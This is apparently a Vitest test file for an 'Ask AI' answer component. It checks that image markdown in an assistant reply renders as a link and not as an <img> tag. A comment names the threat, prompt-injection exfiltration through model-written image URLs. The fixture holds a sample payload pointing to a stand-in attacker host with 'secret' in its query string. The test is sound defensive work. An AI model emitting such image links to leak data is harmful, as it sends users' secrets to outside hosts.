import type { UIMessage } from "ai";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Answer } from "./ask-answer";

describe("Ask AI answer", () => {
  // Catches: a model-written image URL loading in the reader's browser (prompt-injection exfiltration).
  it("renders images as links, never <img>", () => {
    const m = {
      id: "1",
      role: "assistant",
      parts: [{ type: "text", text: "See ![the diagram](https://e.vil/x.png?q=secret)" }],
    } as UIMessage;
    const html = renderToStaticMarkup(<Answer m={m} streaming={false} question="q" />);
    expect(html).not.toContain("<img");
    expect(html).toContain('href="https://e.vil/x.png?q=secret"');
    expect(html).toContain(">the diagram</a>");
  });
});
